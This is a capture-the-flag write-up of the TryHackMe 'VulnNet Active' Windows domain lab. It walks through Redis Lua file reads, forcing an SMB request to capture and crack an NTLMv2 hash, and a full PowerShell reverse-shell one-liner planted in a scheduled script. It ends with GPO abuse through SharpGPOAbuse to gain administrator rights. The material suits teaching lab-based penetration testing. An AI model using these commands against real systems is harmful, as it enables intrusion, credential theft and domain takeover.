# 9 - AD - VulnNet Active

Room link --> [https://tryhackme.com/room/vulnnetactive](https://tryhackme.com/room/vulnnetactive)

Nmap Scan returns: `sudo nmap -sSVC -p- -v -Pn -T4 10.10.102.28`&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49822/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
{% endcode %}

### Redis (port 6379)

[https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
# automatic enumeration.
nmap --script redis-info -sV -p 6379 <IP> -Pn
msf> use auxiliary/scanner/redis/redis_server

# mannual enumeration.
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools.
10.10.66.252:6379> INFO # gives some info about the server-client.
10.10.66.252:6379> CONFIG GET * # we got a username here: [104) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"]

```
{% endcode %}

So the current user name is `enterprise-security`.

### Exploitation <a href="#exploitation-of-redis" id="exploitation-of-redis"></a>

Going through the HackTricks list, we find an [article](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html) that shows how to exploit earlier versions of Redis (our version 2.8.2402 is amongst them):

{% hint style="warning" %}
“Redis can execute Lua scripts (in a sandbox, more on that later) via the “EVAL” command. The sandbox allows the dofile() command (WHY???). It can be used to enumerate files and directories. No specific privilege is needed by Redis… If the Lua script is syntaxically invalid or attempts to set global variables, the error messages will leak some content of the target file”
{% endhint %}

#### Reading files <a href="#reading-files" id="reading-files"></a>

As explained in the linked article, the command we use is the following:

{% code overflow="wrap" lineNumbers="true" %}
```bash
redis-cli -h 10.10.245.19 eval "dofile('<PATH TO FILE>')" 0
```
{% endcode %}

We try to read some of the [common windows files](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/file\_inclusion\_windows.txt) that are usually used for Local File Inclusion.

Let's read the "user.txt" file as asked in the question:

{% code overflow="wrap" lineNumbers="true" %}
```bash
10.10.66.252:6379> EVAL "dofile('C:/Users/enterprise-security/Desktop/user.txt')" 0
```
{% endcode %}

#### SMB credentials capturing[#](https://blog.raw.pm/en/TryHackMe-VulnNet-Active-write-up/#SMB-credentials-capturing) <a href="#smb-credentials-capturing" id="smb-credentials-capturing"></a>

LUA `dofile()` allows us to request a file but since we are on Windows it allows us to request a share as well for example: `dofile('//host/share')`.

So if we launch a SMB server with Responder on one hand and force the server to request a fake share on the other hand, we should be able to capture a NTLM hash.

#### Step 1

we first set up a listener using `Impacket's Responder.py`.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# listener.
sudo responder -i tun0

# request for a fake share.
redis-cli -h EVAL "dofile('//10.18.88.214/fakeshare')" 0
```
{% endcode %}

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>1</p></figcaption></figure>

We captured the NTLMv2 hash for "enterprise-security" user account, we can crack it:

Using haiti to detect the hash type:&#x20;

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>2</p></figcaption></figure>

`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt` - crackin with hashcat.

`john hash.txt --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt` - cracking with john.

{% hint style="info" %}
sand\_0873959498 <--> enterprise-security
{% endhint %}

We have valid credentials now to enumerate SMB.

{% code overflow="wrap" lineNumbers="true" %}
```bash
smbclient -L \\\\10.10.117.3\\ -U 'enterprise-security'
```
{% endcode %}

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>3</p></figcaption></figure>

Connecting to the "Enterprise-Share"

{% code overflow="wrap" lineNumbers="true" %}
```bash
smbclient \\\\10.10.117.3\\Enterprise-Share -U enterprise-security
```
{% endcode %}

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>4</p></figcaption></figure>

We viewed the .ps1 script file, and see its a scheduled script.

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dkingws)-[~]
└─$ cat PurgeIrrelevantData_1826.ps1 
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```
{% endcode %}

We could replace this with a Powershell Oneliner to get a reverse shell.

{% code overflow="wrap" lineNumbers="true" %}
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.18.88.214',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
{% endcode %}

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>5</p></figcaption></figure>

And we got a shell.

#### Priv Esc

We have "SeImpersonatePrivilege", so we could use Potatoe attack or use BloodHound to find another path.

<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>6</p></figcaption></figure>

I used Metasploit and got "Nt Authority".

#### 2nd Method for Priv Esc:

After gaining initial access using the Powershell script, we can use "SharpHound.exe" to gather Domain info, then feed the data to BloodHound to give us shortest path to Admin or Domain Admin.

{% code overflow="wrap" lineNumbers="true" %}
```bash
.\SharpHound.exe -c All
```
{% endcode %}

<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>7</p></figcaption></figure>

&#x20;We can use BloodHound to analyse the found data: Immediately, BloodHound gives us the shortest path from our current user `enterprise-security` to the `Administrator`. Apparently, we do have `GenericWrite` Permissions to one of the `GPO`s - namely `security-pol-vn`.

Copy the .zip file to the Share folder, then download to kali for use in BloodHound.

`powershell cp .\20230907143943_BloodHound.zip C:\Enterprise-Share\20230907143943_BloodHound.zip` .

We can use the [SharpGPOAbuse.exe](https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master) binary to exploit the "GenericWrite" permission on that GPO object.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# 
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "privesc" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
```
{% endcode %}

<figure><img src=".gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>8</p></figcaption></figure>

We can do a `gpupdate /force` - to force update the settings, then when we do a `net users enterprise-security` - we should be added to the Administrator groups now.

<figure><img src=".gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption><p>9</p></figcaption></figure>

Note we are not able to go into the Administrator folder from the shell, but we can access the Administrator folder via the SMB share.

`smbclient \\10.10.92.208\C$ -U enterprise-security` .

DONE !
